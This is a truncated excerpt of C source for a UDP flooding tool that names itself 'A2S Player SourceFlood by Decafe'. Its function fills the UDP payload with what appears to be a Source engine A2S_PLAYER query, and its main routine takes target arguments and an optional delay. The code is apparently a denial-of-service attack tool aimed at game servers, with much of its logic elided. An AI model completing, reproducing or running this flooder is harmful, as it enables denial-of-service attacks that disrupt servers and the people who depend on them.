...
void setup_udp_header(struct udphdr *udph)
{
      ...
      udph->check = 0;
      memcpy((void *)udph + sizeof(struct udphdr), "\xff\xff\xff\xff\x55\x38\x55\x76\x03", 9);
...
int main(int argc, char *argv[ ])
{
        if(argc < 4){
                ...
                fprintf(stderr, "A2S Player SourceFlood by Decafe!\n");
        ...
        fprintf(stdout, "SourceFlood by Decafe...\n");
        if(argc > 4)
        {
                sleep(atoi(argv[4]));
        } else {
